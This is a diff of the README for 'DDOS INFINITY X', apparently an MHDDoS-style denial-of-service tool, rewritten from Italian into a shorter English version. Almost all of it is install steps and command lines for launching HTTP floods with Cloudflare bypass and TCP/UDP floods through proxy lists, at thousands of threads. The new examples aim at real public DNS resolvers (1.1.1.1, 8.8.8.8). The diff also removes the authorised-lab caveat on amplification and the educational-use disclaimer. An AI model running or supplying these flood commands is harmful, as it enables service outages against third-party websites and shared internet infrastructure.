@@ -1,117 +1,63 @@
-# DDOS INFINITY X — Tutti i comandi
+# DDOS INFINITY X — Commands (MHDDoS style)
 
-## Installazione
-
-### Linux / Kali
+## Install
 
 ```bash
 git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
 cd DDOS-INFINITY-X
-chmod +x install.sh run.sh check.sh
-./install.sh
+pip3 install -r requirements.txt
 ```
 
-### Windows
-
-```cmd
-git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
-cd DDOS-INFINITY-X
-install.bat
-```
-
----
-
-## Uso quotidiano
+Kali:
 
 ```bash
-./run.sh              # menu
-./run.sh HELP         # guida
-./run.sh tools        # console strumenti
-./run.sh STOP         # ferma processi
-./check.sh            # verifica dipendenze
+python3 -m venv venv && source venv/bin/activate
+pip3 install -r requirements.txt
 ```
 
----
-
-## Layer 7 — sintassi
+## Help & tools
 
 ```bash
-./run.sh METODO URL SOCKS_TYPE THREADS PROXY_FILE RPC DURATA
+python3 start.py HELP
+python3 start.py tools
+python3 start.py STOP
 ```
 
-**Esempio:**
+## Layer 7
 
 ```bash
-./run.sh GET http://example.com 0 100 http.txt 10 60
-./run.sh POST http://example.com 1 200 http.txt 20 120
-./run.sh CFB https://example.com 5 150 http.txt 10 90
+python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
 ```
 
-**Metodi L7:** GET, POST, OVH, CFB, CFBUAM, BYPASS, SLOW, STRESS, DGB, BOT, XMLRPC, TOR, KILLER, BOMB, …
-
-**Socks type:** `0` all (config) · `1` HTTP · `4` SOCKS4 · `5` SOCKS5 · `6` random
-
----
-
-## Layer 4 — sintassi
+Example:
 
 ```bash
-./run.sh METODO IP:PORTA THREADS DURATA
+python3 start.py GET http://site.com 0 1000 http.txt 10 100
+python3 start.py POST http://site.com 1 500 http.txt 5 60
+python3 start.py CFB https://site.com 0 800 http.txt 10 120
 ```
 
-**Esempio:**
+## Layer 4
 
 ```bash
-./run.sh TCP 10.0.0.5:80 50 30
-./run.sh UDP 10.0.0.5:53 100 60
-./run.sh SYN 10.0.0.5:443 80 45
+python3 start.py <method> <ip:port> <threads> <duration>
 ```
 
-**Con proxy:**
+Example:
 
 ```bash
-./run.sh TCP 10.0.0.5:80 50 30 5 http.txt
+python3 start.py TCP 1.1.1.1:80 500 60
+python3 start.py UDP 8.8.8.8:53 300 30
 ```
 
-**Metodi L4:** TCP, UDP, SYN, ICMP, MINECRAFT, FIVEM, TS3, VSE, CPS, CONNECTION, …
-
-**Amplification** (solo lab autorizzato): MEM, NTP, DNS, RDP, CHAR, CLDAP, ARD + file reflector
-
----
-
-## Tools
+## Layer 4 + proxy
 
 ```bash
-./run.sh tools
+python3 start.py TCP 1.1.1.1:80 500 60 5 http.txt
 ```
 
-Comandi nella console: `PING`, `CHECK`, `DSTAT`, `DNS`, `TSSRV`, `HELP`, `CLEAR`, `EXIT`
-
----
-
-## Docker (opzionale)
+## Optional menu
 
 ```bash
-sudo apt install docker.io docker-compose-v2
-docker compose build
-docker compose run -it --entrypoint /bin/bash infinityx
-python start.py HELP
+python3 start.py MENU
 ```
-
----
-
-## File importanti
-
-| File | Ruolo |
-|------|--------|
-| `config.json` | Proxy providers, Minecraft |
-| `files/proxies/http.txt` | Lista proxy |
-| `files/useragent.txt` | User-Agent |
-| `files/referers.txt` | Referer |
-| `venv/` | Ambiente Python (creato da install.sh) |
-
----
-
-## Disclaimer
-
-For educational purposes only. Unauthorized testing is illegal.
